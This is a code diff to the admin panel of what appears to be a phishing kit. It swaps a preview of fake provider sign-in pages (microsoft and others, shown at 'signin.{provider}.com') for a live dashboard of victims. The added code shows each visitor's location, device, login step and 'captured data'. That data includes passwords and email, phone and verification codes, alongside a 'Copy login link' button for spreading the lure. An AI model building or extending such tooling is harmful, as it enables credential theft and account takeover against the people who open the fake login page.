@@ -687,24 +687,17 @@ export default function AdminPage() {
   const [gCorrectNumber, setGCorrectNumber] = useState(45);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
-  const [previewKey, setPreviewKey] = useState(0);
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
-  const [windowHeight, setWindowHeight] = useState(typeof window !== 'undefined' ? window.innerHeight : 700);
   const wsRef = useRef<WebSocket | null>(null);
 
   useEffect(() => {
-    const onResize = () => { setWindowWidth(window.innerWidth); setWindowHeight(window.innerHeight); };
+    const onResize = () => { setWindowWidth(window.innerWidth); };
     window.addEventListener('resize', onResize);
     return () => window.removeEventListener('resize', onResize);
   }, []);
 
   const isMobileAdmin = windowWidth < 768;
-  const canvasW = isMobileAdmin ? windowWidth : Math.max(400, windowWidth - 240);
-  const canvasH = Math.max(300, windowHeight - 56);
-  const desktopScale = Math.min(0.88, (canvasW - 60) / 980, (canvasH - 60) / 620);
-  const tabletScale  = Math.min(0.82, (canvasW - 60) / 600, (canvasH - 80) / 840);
-  const mobileScale  = Math.min(0.95, (canvasW - 60) / 340, (canvasH - 60) / 740);
 
   useEffect(() => {
     let ws: WebSocket | undefined;
@@ -790,7 +783,6 @@ export default function AdminPage() {
 
   const confirmProviderSwitch = (p: Provider) => {
     setProvider(p);
-    setPreviewKey(k => k + 1);
     if (p !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); }
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
@@ -1082,73 +1074,6 @@ export default function AdminPage() {
             </section>
           )}
 
-          {/* Visitors */}
-          <section className="space-y-2">
-            <div className="flex items-center justify-between px-1">
-              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Visitors</p>
-              {onlineCount > 0 && <span className="text-[10px] font-semibold text-green-400">{onlineCount} live</span>}
-            </div>
-
-            {visitors.length === 0 ? (
-              <div className="rounded-lg border border-dashed border-[#2d3139] px-3 py-4 text-center">
-                <div className="text-[11px] text-[#555d6b]">No visitors yet</div>
-                <div className="text-[10px] text-[#3e4450] mt-0.5">Open the login page to track visitors</div>
-              </div>
-            ) : (
-              <div className="space-y-2">
-                {visitors.map(v => {
-                  const vStepColor = STEP_COLORS[v.step] ?? '#4b5563';
-                  const vStepLabel = STEP_LABELS[v.step] ?? v.step;
-                  const hasData = Object.keys(v.formData ?? {}).length > 0;
-                  const vUA = parseUA(v.userAgent);
-                  return (
-                    <div key={v.id} className={`rounded-xl border overflow-hidden transition-all ${v.online ? 'border-[#2d3139] bg-[#1a1d24]' : 'border-[#232630] bg-[#16181d] opacity-60'}`}>
-                      {/* Header row */}
-                      <div className="flex items-center gap-2 px-3 pt-3 pb-1.5">
-                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${v.online ? 'bg-green-400 animate-pulse' : 'bg-red-500'}`} />
-                        <div className="w-5 h-5 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
-                          <ProviderBadge provider={v.provider} />
-                        </div>
-                        <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: vStepColor }}>
-                          {vStepLabel}
-                        </span>
-                        {hasData && <span className="w-1.5 h-1.5 rounded-full bg-amber-400 flex-shrink-0" title="Has captured data" />}
-                        <span className="text-[10px] text-[#555d6b] truncate ml-auto font-mono">
-                          {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
-                        </span>
-                      </div>
-
-                      {/* Location + device */}
-                      <div className="px-3 pb-2">
-                        <div className="text-[11px] text-[#8a919e]">{v.location.flag} {v.location.city}, {v.location.country}</div>
-                        <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} on {vUA.os}</div>
-                      </div>
-
-                      {/* Action row */}
-                      <div className="px-3 pb-3 flex items-center gap-1.5">
-                        <button
-                          onClick={() => setModalVisitorIp(v.ip)}
-                          className="flex-1 flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors text-[11px] font-medium"
-                          title="Open live view"
-                        >
-                          <Eye className="w-3.5 h-3.5" />
-                          <span>Live View</span>
-                        </button>
-                        <button
-                          onClick={() => { if (confirm('Remove this visitor from the dashboard?')) deleteVisitor(v.id); }}
-                          className="flex items-center justify-center w-7 h-7 rounded-lg bg-[#2d3139] hover:bg-red-900/50 text-[#555d6b] hover:text-red-400 transition-colors flex-shrink-0"
-                          title="Delete visitor record"
-                        >
-                          <Trash2 className="w-3.5 h-3.5" />
-                        </button>
-                      </div>
-                    </div>
-                  );
-                })}
-              </div>
-            )}
-          </section>
-
         </div>
 
         <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
@@ -1156,65 +1081,147 @@ export default function AdminPage() {
         </div>
       </aside>
 
-      {/* Preview canvas */}
-      <main className="flex-1 flex items-center justify-center relative overflow-hidden" style={{ backgroundColor: '#0b0c10' }}>
-        {isMobileAdmin && (
+      {/* Visitor dashboard */}
+      <main className="flex-1 flex flex-col overflow-hidden" style={{ backgroundColor: '#0b0c10' }}>
+
+        {/* Top bar */}
+        <div className="h-14 flex items-center gap-3 px-5 border-b border-[#2d3139] bg-[#0f1115] flex-shrink-0">
+          {isMobileAdmin && (
+            <button
+              onClick={() => setSidebarOpen(true)}
+              className="p-2 rounded-lg bg-[#16181d] border border-[#2d3139] text-[#aeb5c0] hover:text-white transition-colors flex-shrink-0"
+            >
+              <Menu className="w-4 h-4" />
+            </button>
+          )}
+          <div className="flex items-center gap-3 flex-1 min-w-0">
+            <span className="text-white text-[14px] font-semibold">Visitors</span>
+            {onlineCount > 0 && (
+              <span className="flex items-center gap-1.5 bg-green-500/15 text-green-400 text-[11px] font-semibold px-2.5 py-1 rounded-full border border-green-500/25">
+                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
+                {onlineCount} live
+              </span>
+            )}
+            {visitors.length > 0 && (
+              <span className="text-[#555d6b] text-[12px]">{visitors.length} total</span>
+            )}
+          </div>
           <button
-            onClick={() => setSidebarOpen(true)}
-            className="absolute top-4 left-4 z-20 p-2.5 rounded-xl bg-[#16181d] border border-[#2d3139] text-[#aeb5c0] hover:text-white hover:bg-[#1e2128] transition-colors shadow-lg"
+            onClick={() => { navigator.clipboard.writeText(src).catch(() => {}); }}
+            title="Copy login link to clipboard"
+            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1e2128] border border-[#2d3139] text-[#8a919e] hover:text-white hover:border-[#3a3f4a] transition-colors text-[11px] font-medium flex-shrink-0"
           >
-            <Menu className="w-5 h-5" />
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
+              <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
+            </svg>
+            Copy link
           </button>
-        )}
-        <div className="absolute inset-0 pointer-events-none transition-all duration-1000"
-          style={{ background: `radial-gradient(ellipse at center, ${accentColor}22 0%, transparent 65%)` }} />
-        <div className="absolute inset-0 pointer-events-none opacity-30"
-          style={{ backgroundImage: 'radial-gradient(circle, #ffffff18 1px, transparent 1px)', backgroundSize: '24px 24px' }} />
+        </div>
 
-        <div className="relative z-10 flex items-center justify-center transition-all duration-300">
-          {device === 'desktop' && (
-            <div className="flex flex-col rounded-xl overflow-hidden shadow-2xl ring-1 ring-white/10"
-              style={{ width: 980, height: 620, transform: `scale(${desktopScale})`, transformOrigin: 'center center' }}>
-              <div className="h-9 bg-[#2a2a2a] flex items-center px-4 flex-shrink-0 border-b border-black/30">
-                <div className="flex gap-1.5 mr-4">
-                  <div className="w-3 h-3 rounded-full bg-[#ff5f56]" />
-                  <div className="w-3 h-3 rounded-full bg-[#ffbd2e]" />
-                  <div className="w-3 h-3 rounded-full bg-[#27c93f]" />
-                </div>
-                <div className="flex-1 flex justify-center">
-                  <div className="bg-[#1a1a1a] rounded text-[11px] text-[#888] font-mono px-3 py-0.5 w-[340px] text-center truncate">
-                    https://signin.{provider}.com
+        {/* Content area */}
+        <div className="flex-1 overflow-y-auto p-5">
+          {visitors.length === 0 ? (
+            <div className="flex flex-col items-center justify-center h-full min-h-[400px] gap-4 text-center">
+              <div className="w-16 h-16 rounded-2xl bg-[#16181d] border border-[#2d3139] flex items-center justify-center mb-2">
+                <Eye className="w-7 h-7 text-[#3e4450]" />
+              </div>
+              <div>
+                <p className="text-[#aeb5c0] text-[15px] font-semibold mb-1">No visitors yet</p>
+                <p className="text-[#555d6b] text-[13px]">Share the login link above — visitors will appear here live.</p>
+              </div>
+            </div>
+          ) : (
+            <div className="grid gap-4 grid-cols-1 sm:grid-cols-2 xl:grid-cols-3">
+              {visitors.map(v => {
+                const vStepColor = STEP_COLORS[v.step] ?? '#4b5563';
+                const vStepLabel = STEP_LABELS[v.step] ?? v.step;
+                const vUA = parseUA(v.userAgent);
+                const dataEntries = Object.entries(v.formData ?? {});
+                const hasData = dataEntries.length > 0;
+                const isSens = (f: string) => f === 'password' || f === 'email_code' || f === 'phone_code' || f === 'verification_code';
+                return (
+                  <div
+                    key={v.id}
+                    className={`rounded-xl border overflow-hidden flex flex-col transition-all cursor-pointer group
+                      ${v.online
+                        ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
+                        : 'border-[#1e2128] bg-[#13151a] opacity-60'
+                      }`}
+                    onClick={() => setModalVisitorIp(v.ip)}
+                  >
+                    {/* Card header */}
+                    <div className="flex items-start gap-3 px-4 pt-4 pb-3">
+                      <div className="relative flex-shrink-0">
+                        <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center shadow-sm">
+                          <ProviderBadge provider={v.provider} size={18} />
+                        </div>
+                        <div className={`absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full border-2 border-[#16181d] ${v.online ? 'bg-green-400' : 'bg-[#555d6b]'}`} />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-2 flex-wrap">
+                          <span className="text-white text-[13px] font-semibold capitalize">{v.provider}</span>
+                          <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: vStepColor }}>
+                            {vStepLabel}
+                          </span>
+                        </div>
+                        <div className="text-[11px] text-[#8a919e] mt-1">{v.location.flag} {v.location.city}, {v.location.country}</div>
+                        <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} · {vUA.os}</div>
+                      </div>
+                      <div className="flex-shrink-0 text-right">
+                        <div className="text-[10px] font-mono text-[#555d6b]">
+                          {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                        </div>
+                        {hasData && (
+                          <div className="mt-1 flex items-center justify-end gap-1">
+                            <span className="w-1.5 h-1.5 rounded-full bg-amber-400" />
+                            <span className="text-[10px] text-amber-400 font-semibold">{dataEntries.length}</span>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+
+                    {/* Captured data preview */}
+                    {hasData && (
+                      <div className="px-4 pb-3">
+                        <div className="bg-[#0d0f14] rounded-lg px-3 py-2.5 space-y-1.5 border border-[#232630]">
+                          {dataEntries.slice(0, 4).map(([field, value]) => (
+                            <div key={field} className="flex items-center gap-2 min-w-0">
+                              <span className="text-[9px] font-bold uppercase tracking-widest text-[#555d6b] w-[72px] flex-shrink-0 truncate">
+                                {FIELD_LABELS[field] ?? field}
+                              </span>
+                              <span className="text-[11px] font-mono truncate" style={{ color: isSens(field) ? '#6b7280' : '#c9d1d9' }}>
+                                {isSens(field) ? '•'.repeat(Math.min(value.length, 14)) : value || '—'}
+                              </span>
+                            </div>
+                          ))}
+                          {dataEntries.length > 4 && (
+                            <p className="text-[10px] text-[#3e4450] pt-0.5">+{dataEntries.length - 4} more fields</p>
+                          )}
+                        </div>
+                      </div>
+                    )}
+
+                    {/* Footer actions */}
+                    <div className="px-4 pb-4 mt-auto flex gap-2" onClick={e => e.stopPropagation()}>
+                      <button
+                        onClick={() => setModalVisitorIp(v.ip)}
+                        className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors text-[12px] font-medium"
+                      >
+                        <Eye className="w-3.5 h-3.5" />
+                        Live View
+                      </button>
+                      <button
+                        onClick={() => { if (confirm('Remove this visitor from the dashboard?')) deleteVisitor(v.id); }}
+                        className="w-9 h-9 flex items-center justify-center rounded-lg bg-[#2d3139] hover:bg-red-900/50 text-[#555d6b] hover:text-red-400 transition-colors flex-shrink-0"
+                        title="Delete visitor"
+                      >
+                        <Trash2 className="w-3.5 h-3.5" />
+                      </button>
+                    </div>
                   </div>
-                </div>
-              </div>
-              <iframe key={`${src}-${previewKey}`} src={src} className="flex-1 border-0 bg-white" title="Login preview" />
-            </div>
-          )}
-
-          {device === 'tablet' && (
-            <div className="relative bg-black rounded-[2.5rem] p-4 shadow-2xl ring-4 ring-[#2a2a2a]"
-              style={{ width: 600, height: 840, transform: `scale(${tabletScale})`, transformOrigin: 'center center' }}>
-              <div className="absolute top-1/2 -left-4 w-1.5 h-14 bg-[#2a2a2a] rounded-l-md -translate-y-1/2" />
-              <div className="absolute top-1/2 -right-4 w-1.5 h-14 bg-[#2a2a2a] rounded-r-md -translate-y-1/2" />
-              <div className="w-full h-full rounded-[2rem] overflow-hidden border border-white/10">
-                <iframe key={`${src}-${previewKey}`} src={src} className="w-full h-full border-0" title="Login preview" />
-              </div>
-            </div>
-          )}
-
-          {device === 'mobile' && (
-            <div className="relative bg-black rounded-[3rem] p-3 shadow-2xl ring-[5px] ring-[#1a1a1a]"
-              style={{ width: 340, height: 740, transform: `scale(${mobileScale})`, transformOrigin: 'center center' }}>
-              <div className="absolute top-24 -left-3.5 w-1.5 h-8 bg-[#1a1a1a] rounded-l-md" />
-              <div className="absolute top-36 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
-              <div className="absolute top-52 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
-              <div className="absolute top-32 -right-3.5 w-1.5 h-20 bg-[#1a1a1a] rounded-r-md" />
-              <div className="w-full h-full rounded-[2.3rem] overflow-hidden relative bg-white">
-                <div className="absolute top-0 inset-x-0 flex justify-center z-20 pointer-events-none">
-                  <div className="w-[100px] h-[22px] bg-black rounded-b-3xl" />
-                </div>
-                <iframe key={`${src}-${previewKey}`} src={src} className="w-full h-full border-0" title="Login preview" />
-              </div>
+                );
+              })}
             </div>
           )}
         </div>
